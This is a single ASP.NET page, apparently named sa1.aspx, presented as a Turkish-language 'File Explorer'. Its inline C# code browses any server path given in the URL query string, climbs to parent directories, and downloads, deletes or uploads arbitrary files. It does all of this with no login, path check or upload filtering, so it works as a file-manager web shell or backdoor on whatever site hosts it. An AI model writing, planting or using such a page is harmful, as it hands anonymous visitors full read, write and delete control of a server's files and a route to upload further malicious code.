<%@ Page Language="C#" AutoEventWireup="true" %>

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>Dosya Gezgini</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" />
    <style>
        .container {
            margin-top: 20px;
        }
        .table {
            margin-top: 20px;
        }
        .table td, .table th {
            vertical-align: middle;
        }
    </style>
</head>
<body>
    <form id="form1" runat="server" enctype="multipart/form-data">
        <div class="container">
            <h2>Dosya Gezgini</h2>
            <asp:Label ID="Label1" runat="server" Text="Klasör İçeriği:" CssClass="h5"></asp:Label>
            <br /><br />
            <asp:GridView ID="GridView1" runat="server" AutoGenerateColumns="false" OnRowCommand="GridView1_RowCommand" CssClass="table table-bordered table-hover">
                <Columns>
                    <asp:TemplateField>
                        <ItemTemplate>
                            <asp:LinkButton ID="LinkButton1" runat="server" CommandName="Open" CommandArgument='<%# Eval("Path") %>' Text='<%# Eval("Name") %>' CssClass="btn btn-link"></asp:LinkButton>
                        </ItemTemplate>
                        <HeaderTemplate>
                            Dosya/Klasör Adı
                        </HeaderTemplate>
                    </asp:TemplateField>
                    <asp:BoundField DataField="Size" HeaderText="Boyut (KB)" />
                    <asp:BoundField DataField="LastModified" HeaderText="Son Değiştirme Tarihi" />
                    <asp:TemplateField>
                        <ItemTemplate>
                            <asp:Button ID="DeleteButton" runat="server" CommandName="DeleteFile" CommandArgument='<%# Container.DisplayIndex %>' Text="Sil" CssClass="btn btn-danger btn-sm" OnClientClick="return confirm('Bu dosyayı silmek istediğinizden emin misiniz?');" />
                        </ItemTemplate>
                        <HeaderTemplate>
                            İşlem
                        </HeaderTemplate>
                    </asp:TemplateField>
                    <asp:TemplateField>
                        <ItemTemplate>
                            <asp:Button ID="DownloadButton" runat="server" CommandName="DownloadFile" CommandArgument='<%# Eval("Path") %>' Text="İndir" CssClass="btn btn-primary btn-sm" />
                        </ItemTemplate>
                        <HeaderTemplate>
                            İndir
                        </HeaderTemplate>
                    </asp:TemplateField>
                </Columns>
            </asp:GridView>
            <br />
            <div class="form-group">
                <asp:FileUpload ID="FileUpload1" runat="server" CssClass="form-control-file" />
                <asp:Button ID="UploadButton" runat="server" Text="Yükle" CssClass="btn btn-primary" OnClick="UploadButton_Click" />
            </div>
        </div>
    </form>
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
</body>
</html>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            string currentPath = Server.MapPath("~/");

            // Get the current path from the URL parameter
            string urlPath = Request.QueryString["path"];
            if (!string.IsNullOrEmpty(urlPath))
            {
                currentPath = urlPath;
            }

            ViewState["CurrentPath"] = currentPath;
            BindGrid(currentPath);
        }
    }

    private void BindGrid(string path)
    {
        var directoryInfo = new System.IO.DirectoryInfo(path);
        var items = directoryInfo.GetFileSystemInfos()
                                 .Select(info => new
                                 {
                                     Name = info is System.IO.DirectoryInfo ? info.Name + "/" : info.Name,
                                     Path = info.FullName,
                                     IsDirectory = info is System.IO.DirectoryInfo,
                                     Size = info is System.IO.FileInfo ? ((System.IO.FileInfo)info).Length / 1024 : (long?)null,
                                     LastModified = info.LastWriteTime.ToString("dd/MM/yyyy HH:mm")
                                 }).ToList();

        if (directoryInfo.Parent != null)
        {
            items.Insert(0, new
            {
                Name = "..",
                Path = directoryInfo.Parent.FullName,
                IsDirectory = true,
                Size = (long?)null,
                LastModified = (string)null
            });
        }

        GridView1.DataSource = items;
        GridView1.DataBind();
    }

    protected void GridView1_RowCommand(object sender, GridViewCommandEventArgs e)
    {
        if (e.CommandName == "Open")
        {
            string path = e.CommandArgument.ToString();
            if (System.IO.Directory.Exists(path))
            {
                ViewState["CurrentPath"] = path;
                Response.Redirect("sa1.aspx?path=" + Server.UrlEncode(path));
            }
            else if (System.IO.File.Exists(path))
            {
                // Download the file
                Response.Clear();
                Response.ContentType = "application/octet-stream";
                Response.AppendHeader("Content-Disposition", "attachment; filename=" + System.IO.Path.GetFileName(path));
                Response.TransmitFile(path);
                Response.End();
            }
        }
        else if (e.CommandName == "DeleteFile")
        {
            int index = Convert.ToInt32(e.CommandArgument);
            GridViewRow row = GridView1.Rows[index];
            string fileName = ((LinkButton)row.FindControl("LinkButton1")).Text;
            string filePath = System.IO.Path.Combine(ViewState["CurrentPath"].ToString(), fileName);

            if (System.IO.File.Exists(filePath))
            {
                System.IO.File.Delete(filePath);
                BindGrid(ViewState["CurrentPath"].ToString()); // Refresh the grid after deletion
            }
        }
    }

    protected void UploadButton_Click(object sender, EventArgs e)
    {
        if (FileUpload1.HasFile)
        {
            string currentPath = ViewState["CurrentPath"].ToString();
            string filePath = System.IO.Path.Combine(currentPath, FileUpload1.FileName);
            FileUpload1.SaveAs(filePath);
            BindGrid(currentPath); // Refresh the grid after upload
        }
    }
</script>